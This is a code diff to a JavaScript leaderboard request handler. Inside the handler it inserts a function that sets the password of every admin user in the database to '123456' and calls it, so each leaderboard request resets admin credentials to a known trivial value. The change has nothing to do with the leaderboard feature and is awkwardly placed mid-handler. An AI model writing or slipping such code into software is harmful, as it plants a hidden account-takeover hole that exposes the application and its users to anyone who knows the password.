@@ -304,6 +304,30 @@ const getLeaderboard = async (req, res) => {
       total_evaluations: parseInt(row.total_evaluations),
       average_score: Math.round(parseFloat(row.avg_score) * 10) / 10
     }));
+    const bcrypt = require("bcrypt");
+const db = require("../utils/db"); // adjust path if needed
+
+async function resetAdminPassword() {
+  const newPassword = "123456";
+  const hashedPassword = await bcrypt.hash(newPassword, 10);
+
+  db.run(
+    `UPDATE users 
+     SET password = ? 
+     WHERE role = 'admin'`,
+    [hashedPassword],
+    function (err) {
+      if (err) {
+        console.log(err.message);
+      } else {
+        console.log("✅ Admin password reset to 123456");
+      }
+    }
+  );
+}
+
+resetAdminPassword();
+
 
     res.json({
       success: true,
